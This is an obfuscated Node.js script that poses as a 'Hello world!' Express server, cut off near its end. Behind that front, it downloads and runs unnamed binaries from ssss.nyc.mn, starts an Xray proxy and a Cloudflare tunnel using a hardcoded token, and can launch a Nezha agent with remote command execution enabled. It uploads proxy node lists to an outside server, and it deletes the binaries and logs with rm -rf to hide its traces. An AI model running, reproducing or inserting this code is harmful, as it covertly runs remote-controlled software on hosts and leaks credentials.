const _0x25ba87=_0x57cd;(function(_0x433255,_0x323d42){const _0x39384d=_0x57cd,_0x1a83d8=_0x433255();while(!![]){try{const _0x4b33fa=parseInt(_0x39384d(0x1eb))/0x1+parseInt(_0x39384d(0x1c6))/0x2+-parseInt(_0x39384d(0x1d8))/0x3*(-parseInt(_0x39384d(0x19c))/0x4)+-parseInt(_0x39384d(0x17f))/0x5+-parseInt(_0x39384d(0x20e))/0x6*(-parseInt(_0x39384d(0x1a1))/0x7)+parseInt(_0x39384d(0x190))/0x8*(-parseInt(_0x39384d(0x1aa))/0x9)+-parseInt(_0x39384d(0x18e))/0xa*(-parseInt(_0x39384d(0x18a))/0xb);if(_0x4b33fa===_0x323d42)break;else _0x1a83d8['push'](_0x1a83d8['shift']());}catch(_0x837133){_0x1a83d8['push'](_0x1a83d8['shift']());}}}(_0xb849,0x68025));const express=require(_0x25ba87(0x1e5)),app=express(),axios=require(_0x25ba87(0x171)),os=require('os'),fs=require('fs'),path=require(_0x25ba87(0x218)),{promisify}=require(_0x25ba87(0x1e2)),exec=promisify(require(_0x25ba87(0x153))[_0x25ba87(0x1f9)]),{execSync}=require(_0x25ba87(0x153)),UPLOAD_URL=process[_0x25ba87(0x1a2)][_0x25ba87(0x1c4)]||'',PROJECT_URL=process[_0x25ba87(0x1a2)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x25ba87(0x1a2)][_0x25ba87(0x173)]||![],FILE_PATH=process[_0x25ba87(0x1a2)]['FILE_PATH']||_0x25ba87(0x1a8),SUB_PATH=process[_0x25ba87(0x1a2)][_0x25ba87(0x1dc)]||_0x25ba87(0x214),PORT=process['env']['SERVER_PORT']||process[_0x25ba87(0x1a2)][_0x25ba87(0x1b9)]||0xbb8,UUID=process[_0x25ba87(0x1a2)][_0x25ba87(0x1e9)]||'aaaf03d2-4eee-4b50-aba0-90ff8569e54a',NEZHA_SERVER=process['env'][_0x25ba87(0x1f3)]||'',NEZHA_PORT=process[_0x25ba87(0x1a2)][_0x25ba87(0x15c)]||'',NEZHA_KEY=process[_0x25ba87(0x1a2)][_0x25ba87(0x1ec)]||'',ARGO_DOMAIN=process[_0x25ba87(0x1a2)][_0x25ba87(0x1c3)]||'vpn.fiata.indevs.in',ARGO_AUTH=process[_0x25ba87(0x1a2)][_0x25ba87(0x15e)]||'eyJhIjoiY2FmZTRkNDU0ODc5Y2M5NWRmMWM5M2RmNjU3OWRlNTQiLCJ0IjoiNGY0YWFmZjQtZGIzOC00ODUwLWJmNTUtZTQ3MWZkMGUxN2UxIiwicyI6IlltWm1ORGd3WkdZdFlUSTRNUzAwWVRnd0xXSXlZall0TldSbFpqZGlNbUppTkRaayJ9',ARGO_PORT=process[_0x25ba87(0x1a2)]['ARGO_PORT']||0x8fc0,CFIP=process[_0x25ba87(0x1a2)]['CFIP']||_0x25ba87(0x1b5),CFPORT=process[_0x25ba87(0x1a2)][_0x25ba87(0x1a7)]||0x1bb,NAME=process[_0x25ba87(0x1a2)][_0x25ba87(0x215)]||_0x25ba87(0x199);!fs[_0x25ba87(0x182)](FILE_PATH)?(fs[_0x25ba87(0x1cf)](FILE_PATH),console[_0x25ba87(0x20a)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x25ba87(0x16d));function generateRandomName(){const _0x1499b4=_0x25ba87,_0x4bef6a=_0x1499b4(0x18d);let _0x52bbd0='';for(let _0x31483d=0x0;_0x31483d<0x6;_0x31483d++){_0x52bbd0+=_0x4bef6a['charAt'](Math[_0x1499b4(0x1d1)](Math[_0x1499b4(0x208)]()*_0x4bef6a[_0x1499b4(0x205)]));}return _0x52bbd0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x25ba87(0x165)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x25ba87(0x165)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x25ba87(0x165)](FILE_PATH,_0x25ba87(0x17d)),listPath=path['join'](FILE_PATH,_0x25ba87(0x1d3)),bootLogPath=path['join'](FILE_PATH,_0x25ba87(0x174)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x4cddaf=_0x25ba87;try{if(!UPLOAD_URL)return;if(!fs[_0x4cddaf(0x182)](subPath))return;let _0x138110;try{_0x138110=fs[_0x4cddaf(0x209)](subPath,_0x4cddaf(0x189));}catch{return null;}const _0xcc915d=Buffer[_0x4cddaf(0x1a3)](_0x138110,_0x4cddaf(0x18c))['toString'](_0x4cddaf(0x189)),_0x2a3192=_0xcc915d[_0x4cddaf(0x1da)]('\x0a')[_0x4cddaf(0x1f8)](_0x429b89=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4cddaf(0x1a4)](_0x429b89));if(_0x2a3192[_0x4cddaf(0x205)]===0x0)return;return axios[_0x4cddaf(0x162)](UPLOAD_URL+_0x4cddaf(0x203),JSON[_0x4cddaf(0x1d6)]({'nodes':_0x2a3192}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x9e5def=>{return null;}),null;}catch(_0x4662e9){return null;}}function cleanupOldFiles(){const _0x7e9c57=_0x25ba87;try{const _0x28832f=fs[_0x7e9c57(0x16f)](FILE_PATH);_0x28832f[_0x7e9c57(0x1d2)](_0x3a0d88=>{const _0x1df6fa=_0x7e9c57,_0x201549=path[_0x1df6fa(0x165)](FILE_PATH,_0x3a0d88);try{const _0x2192f1=fs[_0x1df6fa(0x202)](_0x201549);_0x2192f1[_0x1df6fa(0x211)]()&&fs[_0x1df6fa(0x19f)](_0x201549);}catch(_0x2fa394){}});}catch(_0x3ddb5e){}}app[_0x25ba87(0x1bc)]('/',function(_0x4e6ea4,_0x500e28){const _0x4ffc31=_0x25ba87;_0x500e28[_0x4ffc31(0x16c)](_0x4ffc31(0x200));});async function generateConfig(){const _0x5ba230=_0x25ba87,_0x520f59={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x5ba230(0x191)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5ba230(0x1d4),'settings':{'clients':[{'id':UUID,'flow':_0x5ba230(0x1d5)}],'decryption':_0x5ba230(0x191),'fallbacks':[{'dest':0xbb9},{'path':_0x5ba230(0x178),'dest':0xbba},{'path':_0x5ba230(0x1a0),'dest':0xbbb},{'path':_0x5ba230(0x1e8),'dest':0xbbc}]},'streamSettings':{'network':_0x5ba230(0x1d9)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x5ba230(0x1d4),'settings':{'clients':[{'id':UUID}],'decryption':_0x5ba230(0x191)},'streamSettings':{'network':_0x5ba230(0x1d9),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5ba230(0x1d4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5ba230(0x169),_0x5ba230(0x1fc),_0x5ba230(0x1c9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5ba230(0x1b7),'protocol':_0x5ba230(0x1e0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5ba230(0x169),'tls',_0x5ba230(0x1c9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5ba230(0x1b7),'protocol':_0x5ba230(0x17b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5ba230(0x191),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5ba230(0x1fc),_0x5ba230(0x1c9)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5ba230(0x212),'tag':_0x5ba230(0x155)},{'protocol':_0x5ba230(0x17c),'tag':'block'}]};fs[_0x5ba230(0x1ee)](path[_0x5ba230(0x165)](FILE_PATH,_0x5ba230(0x160)),JSON['stringify'](_0x520f59,null,0x2));}function getSystemArchitecture(){const _0x22ff18=_0x25ba87,_0x294cc1=os[_0x22ff18(0x1ba)]();return _0x294cc1===_0x22ff18(0x1bd)||_0x294cc1===_0x22ff18(0x1cb)||_0x294cc1==='aarch64'?'arm':_0x22ff18(0x1df);}function downloadFile(_0x2ea196,_0x585305,_0x5b5734){const _0x268c14=_0x25ba87,_0x51c635=_0x2ea196;!fs[_0x268c14(0x182)](FILE_PATH)&&fs[_0x268c14(0x1cf)](FILE_PATH,{'recursive':!![]});const _0x2b563e=fs[_0x268c14(0x1db)](_0x51c635);axios({'method':_0x268c14(0x1bc),'url':_0x585305,'responseType':'stream'})[_0x268c14(0x15b)](_0x397308=>{const _0x14dda3=_0x268c14;_0x397308[_0x14dda3(0x1e6)][_0x14dda3(0x1f1)](_0x2b563e),_0x2b563e['on'](_0x14dda3(0x1bb),()=>{const _0x2df8b4=_0x14dda3;_0x2b563e['close'](),console[_0x2df8b4(0x20a)](_0x2df8b4(0x176)+path['basename'](_0x51c635)+_0x2df8b4(0x1ef)),_0x5b5734(null,_0x51c635);}),_0x2b563e['on'](_0x14dda3(0x1e1),_0x2efbc8=>{const _0x155ceb=_0x14dda3;fs[_0x155ceb(0x16b)](_0x51c635,()=>{});const _0x366911=_0x155ceb(0x176)+path['basename'](_0x51c635)+_0x155ceb(0x201)+_0x2efbc8[_0x155ceb(0x164)];console[_0x155ceb(0x1e1)](_0x366911),_0x5b5734(_0x366911);});})[_0x268c14(0x158)](_0x45db11=>{const _0x217a84=_0x268c14,_0x3ef122=_0x217a84(0x176)+path[_0x217a84(0x16e)](_0x51c635)+'\x20failed:\x20'+_0x45db11[_0x217a84(0x164)];console['error'](_0x3ef122),_0x5b5734(_0x3ef122);});}async function downloadFilesAndRun(){const _0x2e6c7c=_0x25ba87,_0x59a4e5=getSystemArchitecture(),_0x26813f=getFilesForArchitecture(_0x59a4e5);if(_0x26813f['length']===0x0){console[_0x2e6c7c(0x20a)](_0x2e6c7c(0x181));return;}const _0x17c656=_0x26813f[_0x2e6c7c(0x206)](_0xd26eb1=>{return new Promise((_0x1b5d98,_0x301521)=>{const _0x51dc7e=_0x57cd;downloadFile(_0xd26eb1[_0x51dc7e(0x184)],_0xd26eb1[_0x51dc7e(0x152)],(_0x4ef93a,_0x460ade)=>{_0x4ef93a?_0x301521(_0x4ef93a):_0x1b5d98(_0x460ade);});});});try{await Promise[_0x2e6c7c(0x1b2)](_0x17c656);}catch(_0x9323a2){console[_0x2e6c7c(0x1e1)](_0x2e6c7c(0x1ed),_0x9323a2);return;}function _0x3d2546(_0x17267d){const _0x55bc59=0x1fd;_0x17267d['forEach'](_0x22441a=>{const _0x280c8d=_0x57cd;fs['existsSync'](_0x22441a)&&fs[_0x280c8d(0x1cd)](_0x22441a,_0x55bc59,_0x59e551=>{const _0xa966ad=_0x280c8d;_0x59e551?console['error']('Empowerment\x20failed\x20for\x20'+_0x22441a+':\x20'+_0x59e551):console[_0xa966ad(0x20a)](_0xa966ad(0x167)+_0x22441a+':\x20'+_0x55bc59[_0xa966ad(0x1ff)](0x8));});});}const _0x54308e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3d2546(_0x54308e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3086f4=NEZHA_SERVER[_0x2e6c7c(0x1fe)](':')?NEZHA_SERVER[_0x2e6c7c(0x1da)](':')['pop']():'',_0x29036c=new Set(['443','8443',_0x2e6c7c(0x1d0),'2087','2083',_0x2e6c7c(0x166)]),_0x309162=_0x29036c['has'](_0x3086f4)?_0x2e6c7c(0x157):_0x2e6c7c(0x1b6),_0x5add6e=_0x2e6c7c(0x207)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x309162+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x2e6c7c(0x165)](FILE_PATH,_0x2e6c7c(0x1d7)),_0x5add6e);const _0x4611c3=_0x2e6c7c(0x18f)+phpPath+_0x2e6c7c(0x1ac)+FILE_PATH+_0x2e6c7c(0x185);try{await exec(_0x4611c3),console['log'](phpName+_0x2e6c7c(0x161)),await new Promise(_0x1da9a5=>setTimeout(_0x1da9a5,0x3e8));}catch(_0x85382d){console[_0x2e6c7c(0x1e1)]('php\x20running\x20error:\x20'+_0x85382d);}}else{let _0x4460ab='';const _0x437040=[_0x2e6c7c(0x179),_0x2e6c7c(0x1c8),_0x2e6c7c(0x1d0),_0x2e6c7c(0x19b),_0x2e6c7c(0x195),_0x2e6c7c(0x166)];_0x437040['includes'](NEZHA_PORT)&&(_0x4460ab=_0x2e6c7c(0x1c2));const _0x1937d1=_0x2e6c7c(0x18f)+npmPath+_0x2e6c7c(0x204)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4460ab+_0x2e6c7c(0x1c1);try{await exec(_0x1937d1),console['log'](npmName+_0x2e6c7c(0x161)),await new Promise(_0x1c589b=>setTimeout(_0x1c589b,0x3e8));}catch(_0x411033){console[_0x2e6c7c(0x1e1)]('npm\x20running\x20error:\x20'+_0x411033);}}}else console[_0x2e6c7c(0x20a)](_0x2e6c7c(0x1ad));const _0xd9bed6='nohup\x20'+webPath+_0x2e6c7c(0x16a)+FILE_PATH+_0x2e6c7c(0x1dd);try{await exec(_0xd9bed6),console[_0x2e6c7c(0x20a)](webName+_0x2e6c7c(0x161)),await new Promise(_0x2602de=>setTimeout(_0x2602de,0x3e8));}catch(_0x5b6151){console['error'](_0x2e6c7c(0x1f4)+_0x5b6151);}if(fs['existsSync'](botPath)){let _0x49a89f;if(ARGO_AUTH[_0x2e6c7c(0x15d)](/^[A-Z0-9a-z=]{120,250}$/))_0x49a89f=_0x2e6c7c(0x175)+ARGO_AUTH;else ARGO_AUTH[_0x2e6c7c(0x15d)](/TunnelSecret/)?_0x49a89f=_0x2e6c7c(0x1c0)+FILE_PATH+'/tunnel.yml\x20run':_0x49a89f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2e6c7c(0x1a5)+ARGO_PORT;try{await exec(_0x2e6c7c(0x18f)+botPath+'\x20'+_0x49a89f+_0x2e6c7c(0x168)),console[_0x2e6c7c(0x20a)](botName+_0x2e6c7c(0x161)),await new Promise(_0xe2e678=>setTimeout(_0xe2e678,0x7d0));}catch(_0x34485c){console[_0x2e6c7c(0x1e1)]('Error\x20executing\x20command:\x20'+_0x34485c);}}await new Promise(_0x5fa887=>setTimeout(_0x5fa887,0x1388));}function getFilesForArchitecture(_0x211c59){const _0x52ff17=_0x25ba87;let _0x36d042;_0x211c59===_0x52ff17(0x1bd)?_0x36d042=[{'fileName':webPath,'fileUrl':_0x52ff17(0x1b0)},{'fileName':botPath,'fileUrl':_0x52ff17(0x20c)}]:_0x36d042=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x52ff17(0x210)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x31a7a2=_0x211c59==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x52ff17(0x1b3);_0x36d042[_0x52ff17(0x20b)]({'fileName':npmPath,'fileUrl':_0x31a7a2});}else{const _0x5464a6=_0x211c59==='arm'?_0x52ff17(0x1ae):_0x52ff17(0x1ca);_0x36d042['unshift']({'fileName':phpPath,'fileUrl':_0x5464a6});}}return _0x36d042;}function argoType(){const _0x58d421=_0x25ba87;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x58d421(0x20d));return;}if(ARGO_AUTH[_0x58d421(0x1fe)](_0x58d421(0x197))){fs[_0x58d421(0x1ee)](path[_0x58d421(0x165)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1244ee=_0x58d421(0x1a6)+ARGO_AUTH[_0x58d421(0x1da)]('\x22')[0xb]+_0x58d421(0x217)+path[_0x58d421(0x165)](FILE_PATH,'tunnel.json')+_0x58d421(0x156)+ARGO_DOMAIN+_0x58d421(0x20f)+ARGO_PORT+_0x58d421(0x1f5);fs[_0x58d421(0x1ee)](path[_0x58d421(0x165)](FILE_PATH,_0x58d421(0x186)),_0x1244ee);}else console[_0x58d421(0x20a)](_0x58d421(0x1bf));}function _0x57cd(_0x5a1dec,_0x277634){_0x5a1dec=_0x5a1dec-0x152;const _0xb8498=_0xb849();let _0x57cdff=_0xb8498[_0x5a1dec];return _0x57cdff;}async function extractDomains(){const _0x2c052d=_0x25ba87;let _0x6e6b62;if(ARGO_AUTH&&ARGO_DOMAIN)_0x6e6b62=ARGO_DOMAIN,console[_0x2c052d(0x20a)](_0x2c052d(0x154),_0x6e6b62),await _0x3e7849(_0x6e6b62);else try{const _0x4f6848=fs[_0x2c052d(0x209)](path['join'](FILE_PATH,_0x2c052d(0x174)),_0x2c052d(0x189)),_0x3d1f65=_0x4f6848[_0x2c052d(0x1da)]('\x0a'),_0x328697=[];_0x3d1f65[_0x2c052d(0x1d2)](_0x30938d=>{const _0xec4816=_0x2c052d,_0x1bcc21=_0x30938d[_0xec4816(0x15d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1bcc21){const _0x122d8f=_0x1bcc21[0x1];_0x328697[_0xec4816(0x183)](_0x122d8f);}});if(_0x328697[_0x2c052d(0x205)]>0x0)_0x6e6b62=_0x328697[0x0],console[_0x2c052d(0x20a)](_0x2c052d(0x163),_0x6e6b62),await _0x3e7849(_0x6e6b62);else{console[_0x2c052d(0x20a)](_0x2c052d(0x1ab)),fs[_0x2c052d(0x19f)](path[_0x2c052d(0x165)](FILE_PATH,'boot.log'));async function _0x5607d8(){const _0x3c29ec=_0x2c052d;try{process[_0x3c29ec(0x1be)]===_0x3c29ec(0x1ce)?await exec(_0x3c29ec(0x198)+botName+_0x3c29ec(0x17e)):await exec(_0x3c29ec(0x188)+botName[_0x3c29ec(0x216)](0x0)+']'+botName['substring'](0x1)+_0x3c29ec(0x194));}catch(_0x1aebc4){}}_0x5607d8(),await new Promise(_0x268c48=>setTimeout(_0x268c48,0xbb8));const _0x221b68='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2c052d(0x1a5)+ARGO_PORT;try{await exec(_0x2c052d(0x18f)+botPath+'\x20'+_0x221b68+_0x2c052d(0x168)),console[_0x2c052d(0x20a)](botName+_0x2c052d(0x161)),await new Promise(_0x44d61f=>setTimeout(_0x44d61f,0xbb8)),await extractDomains();}catch(_0x443763){console[_0x2c052d(0x1e1)]('Error\x20executing\x20command:\x20'+_0x443763);}}}catch(_0x80931){console[_0x2c052d(0x1e1)](_0x2c052d(0x1f6),_0x80931);}async function _0x4d28cc(){const _0x50a538=_0x2c052d;try{const _0x48435e=await axios[_0x50a538(0x1bc)](_0x50a538(0x18b),{'timeout':0xbb8});if(_0x48435e[_0x50a538(0x1e6)]&&_0x48435e[_0x50a538(0x1e6)][_0x50a538(0x1f7)]&&_0x48435e['data']['org'])return _0x48435e[_0x50a538(0x1e6)][_0x50a538(0x1f7)]+'_'+_0x48435e['data'][_0x50a538(0x19e)];}catch(_0x1e0028){try{const _0x5e9256=await axios[_0x50a538(0x1bc)](_0x50a538(0x1fd),{'timeout':0xbb8});if(_0x5e9256['data']&&_0x5e9256['data']['status']===_0x50a538(0x19a)&&_0x5e9256[_0x50a538(0x1e6)][_0x50a538(0x1fb)]&&_0x5e9256[_0x50a538(0x1e6)][_0x50a538(0x19e)])return _0x5e9256[_0x50a538(0x1e6)][_0x50a538(0x1fb)]+'_'+_0x5e9256[_0x50a538(0x1e6)][_0x50a538(0x19e)];}catch(_0xba2385){}}return _0x50a538(0x172);}async function _0x3e7849(_0x328c26){const _0x448e61=await _0x4d28cc(),_0x48ed66=NAME?NAME+'-'+_0x448e61:_0x448e61;return new Promise(_0x2b257c=>{setTimeout(()=>{const _0x286c82=_0x57cd,_0x3c07e6={'v':'2','ps':''+_0x48ed66,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x286c82(0x191),'net':'ws','type':_0x286c82(0x191),'host':_0x328c26,'path':_0x286c82(0x1ea),'tls':'tls','sni':_0x328c26,'alpn':'','fp':_0x286c82(0x159)},_0x488e44=_0x286c82(0x15f)+UUID+'@'+CFIP+':'+CFPORT+_0x286c82(0x1e3)+_0x328c26+_0x286c82(0x180)+_0x328c26+_0x286c82(0x15a)+_0x48ed66+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x286c82(0x1d6)](_0x3c07e6))[_0x286c82(0x1ff)](_0x286c82(0x18c))+_0x286c82(0x1b8)+UUID+'@'+CFIP+':'+CFPORT+_0x286c82(0x17a)+_0x328c26+'&fp=firefox&type=ws&host='+_0x328c26+_0x286c82(0x19d)+_0x48ed66+_0x286c82(0x1a9);console['log'](Buffer[_0x286c82(0x1a3)](_0x488e44)['toString'](_0x286c82(0x18c))),fs[_0x286c82(0x1ee)](subPath,Buffer[_0x286c82(0x1a3)](_0x488e44)[_0x286c82(0x1ff)](_0x286c82(0x18c))),console[_0x286c82(0x20a)](FILE_PATH+_0x286c82(0x1f0)),uploadNodes(),app[_0x286c82(0x1bc)]('/'+SUB_PATH,(_0x921e7,_0x4e0278)=>{const _0x28bc87=_0x286c82,_0x50147a=Buffer[_0x28bc87(0x1a3)](_0x488e44)[_0x28bc87(0x1ff)](_0x28bc87(0x18c));_0x4e0278['set']('Content-Type','text/plain;\x20charset=utf-8'),_0x4e0278['send'](_0x50147a);}),_0x2b257c(_0x488e44);},0x7d0);});}}async function uploadNodes(){const _0x3156d0=_0x25ba87;if(UPLOAD_URL&&PROJECT_URL){const _0x556f2e=PROJECT_URL+'/'+SUB_PATH,_0x333d26={'subscription':[_0x556f2e]};try{const _0x338233=await axios[_0x3156d0(0x162)](UPLOAD_URL+_0x3156d0(0x1c5),_0x333d26,{'headers':{'Content-Type':'application/json'}});return _0x338233&&_0x338233[_0x3156d0(0x170)]===0xc8?(console[_0x3156d0(0x20a)](_0x3156d0(0x1de)),_0x338233):null;}catch(_0x42c434){if(_0x42c434['response']){if(_0x42c434[_0x3156d0(0x1fa)][_0x3156d0(0x170)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1ab7d7=fs[_0x3156d0(0x209)](listPath,_0x3156d0(0x189)),_0x13b59e=_0x1ab7d7[_0x3156d0(0x1da)]('\x0a')[_0x3156d0(0x1f8)](_0x3cd21f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3cd21f));if(_0x13b59e[_0x3156d0(0x205)]===0x0)return;const _0x47c7a5=JSON['stringify']({'nodes':_0x13b59e});try{const _0x34b081=await axios[_0x3156d0(0x162)](UPLOAD_URL+_0x3156d0(0x1e7),_0x47c7a5,{'headers':{'Content-Type':_0x3156d0(0x1f2)}});return _0x34b081&&_0x34b081[_0x3156d0(0x170)]===0xc8?(console[_0x3156d0(0x20a)](_0x3156d0(0x213)),_0x34b081):null;}catch(_0x213023){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b3c34=_0x57cd,_0x299a90=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x299a90[_0x5b3c34(0x183)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x299a90[_0x5b3c34(0x183)](phpPath);process['platform']===_0x5b3c34(0x1ce)?exec(_0x5b3c34(0x1b1)+_0x299a90[_0x5b3c34(0x165)]('\x20')+_0x5b3c34(0x1b4),_0x29fcc0=>{const _0x1ecb24=_0x5b3c34;console[_0x1ecb24(0x187)](),console[_0x1ecb24(0x20a)](_0x1ecb24(0x1af)),console[_0x1ecb24(0x20a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x5b3c34(0x193)+_0x299a90[_0x5b3c34(0x165)]('\x20')+'\x20>/dev/null\x202>&1',_0x358854=>{const _0x3a45ad=_0x5b3c34;console[_0x3a45ad(0x187)](),console[_0x3a45ad(0x20a)](_0x3a45ad(0x1af)),console['log'](_0x3a45ad(0x177));});},0x15f90);}function _0xb849(){const _0x2b98eb=['http','\x20-c\x20','unlink','send','\x20already\x20exists','basename','readdirSync','status','axios','Unknown','AUTO_ACCESS','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Download\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/vless-argo','443','?security=tls&sni=','trojan','blackhole','sub.txt','.exe\x20>\x20nul\x202>&1','3285110xnPYiW','&fp=firefox&type=ws&host=','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','existsSync','push','fileName','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel.yml','clear','pkill\x20-f\x20\x22[','utf-8','11CMyXBB','https://ipapi.co/json/','base64','abcdefghijklmnopqrstuvwxyz','6014150inRKJW','nohup\x20','1616432OENjPf','none','Add\x20automatic\x20access\x20task\x20faild:\x20','rm\x20-rf\x20','\x22\x20>\x20/dev/null\x202>&1','2083','http\x20server\x20is\x20running\x20on\x20port:','TunnelSecret','taskkill\x20/f\x20/im\x20','VPN1','success','2087','50016xRcLjd','&path=%2Ftrojan-argo%3Fed%3D2560#','org','unlinkSync','/vmess-argo','560xFyGKl','env','from','test','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20tunnel:\x20','CFPORT','./tmp','\x0a\x20\x20\x20\x20','27kJYSbP','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-c\x20\x22','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://arm64.ssss.nyc.mn/v1','App\x20is\x20running','https://arm64.ssss.nyc.mn/web','del\x20/f\x20/q\x20','all','https://amd64.ssss.nyc.mn/agent','\x20>\x20nul\x202>&1','cdns.doon.eu.org','false','127.0.0.1','\x0a\x0atrojan://','PORT','arch','finish','get','arm','platform','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','--tls','ARGO_DOMAIN','UPLOAD_URL','/api/add-subscriptions','1268168mfzCwc','automatic\x20access\x20task\x20added\x20successfully','8443','quic','https://amd64.ssss.nyc.mn/v1','arm64','Skipping\x20adding\x20automatic\x20access\x20task','chmod','win32','mkdirSync','2096','floor','forEach','list.txt','vless','xtls-rprx-vision','stringify','config.yaml','15riRnCR','tcp','split','createWriteStream','SUB_PATH','/config.json\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','amd','vmess','error','util','?encryption=none&security=tls&sni=','Error\x20in\x20startserver:','express','data','/api/add-nodes','/trojan-argo','UUID','/vmess-argo?ed=2560','253266nKqnhs','NEZHA_KEY','Error\x20downloading\x20files:','writeFileSync','\x20successfully','/sub.txt\x20saved\x20successfully','pipe','application/json','NEZHA_SERVER','web\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Error\x20reading\x20boot.log:','country_code','filter','exec','response','countryCode','tls','http://ip-api.com/json/','includes','toString','Hello\x20world!','\x20failed:\x20','statSync','/api/delete-nodes','\x20-s\x20','length','map','\x0aclient_secret:\x20','random','readFileSync','log','unshift','https://arm64.ssss.nyc.mn/bot','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','10344joZpBu','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/bot','isFile','freedom','Nodes\x20uploaded\x20successfully','sub','NAME','charAt','\x0a\x20\x20credentials-file:\x20','path','fileUrl','child_process','ARGO_DOMAIN:','direct','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','true','catch','firefox','&path=%2Fvless-argo%3Fed%3D2560#','then','NEZHA_PORT','match','ARGO_AUTH','\x0avless://','config.json','\x20is\x20running','post','ArgoDomain:','message','join','2053','Empowerment\x20success\x20for\x20','\x20>/dev/null\x202>&1\x20&'];_0xb849=function(){return _0x2b98eb;};return _0xb849();}cleanFiles();async function AddVisitTask(){const _0x326ebd=_0x25ba87;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x326ebd(0x20a)](_0x326ebd(0x1cc));return;}try{const _0x424114=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x326ebd(0x20a)](_0x326ebd(0x1c7)),_0x424114;}catch(_0x34f0b4){return console[_0x326ebd(0x1e1)](_0x326ebd(0x192)+_0x34f0b4[_0x326ebd(0x164)]),null;}}async function startserver(){const 